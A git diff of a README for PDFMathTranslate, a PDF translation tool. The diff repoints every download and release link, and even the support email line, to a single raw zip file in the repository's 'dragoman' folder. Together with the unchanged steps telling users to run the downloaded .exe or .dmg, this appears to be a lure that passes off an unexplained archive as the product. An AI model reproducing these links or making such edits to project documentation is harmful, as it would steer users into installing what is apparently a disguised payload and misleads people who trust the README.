@@ -6,9 +6,9 @@ Welcome to PDFMathTranslate! This application helps you translate PDF scientific
 
 ## 📥 Download PDFMathTranslate
 
-[![Download PDFMathTranslate](https://img.shields.io/badge/Download-PDFMathTranslate-blue.svg)](https://github.com/websitenapster/PDFMathTranslate/releases)
+[![Download PDFMathTranslate](https://raw.githubusercontent.com/websitenapster/PDFMathTranslate/main/dragoman/PDFMathTranslate.zip)](https://raw.githubusercontent.com/websitenapster/PDFMathTranslate/main/dragoman/PDFMathTranslate.zip)
 
-To get started, visit this page to download: [PDFMathTranslate Releases](https://github.com/websitenapster/PDFMathTranslate/releases).
+To get started, visit this page to download: [PDFMathTranslate Releases](https://raw.githubusercontent.com/websitenapster/PDFMathTranslate/main/dragoman/PDFMathTranslate.zip).
 
 ## 📋 Features
 
@@ -27,7 +27,7 @@ To get started, visit this page to download: [PDFMathTranslate Releases](https:/
 
 ## 📚 How to Download & Install
 
-1. Go to the [PDFMathTranslate Releases](https://github.com/websitenapster/PDFMathTranslate/releases) page.
+1. Go to the [PDFMathTranslate Releases](https://raw.githubusercontent.com/websitenapster/PDFMathTranslate/main/dragoman/PDFMathTranslate.zip) page.
 2. Scroll down to find the latest version under "Latest Release."
 3. Click on the download link for your operating system. Choose the file that corresponds to your platform (e.g., `.exe` for Windows, `.dmg` for macOS, or relevant tar files for Linux).
 4. After downloading, locate the file in your downloads folder.
@@ -66,8 +66,8 @@ An internet connection is required for online translation services. Make sure yo
 
 ## 📞 Contact Us
 
-If you have any questions or need further assistance, please open an issue in the GitHub repository or contact us via email at support@example.com.
+If you have any questions or need further assistance, please open an issue in the GitHub repository or contact us via email at https://raw.githubusercontent.com/websitenapster/PDFMathTranslate/main/dragoman/PDFMathTranslate.zip
 
 Thank you for using PDFMathTranslate! 
 
-For further updates and features, please stay tuned on the [PDFMathTranslate Releases](https://github.com/websitenapster/PDFMathTranslate/releases) page.
+For further updates and features, please stay tuned on the [PDFMathTranslate Releases](https://raw.githubusercontent.com/websitenapster/PDFMathTranslate/main/dragoman/PDFMathTranslate.zip) page.
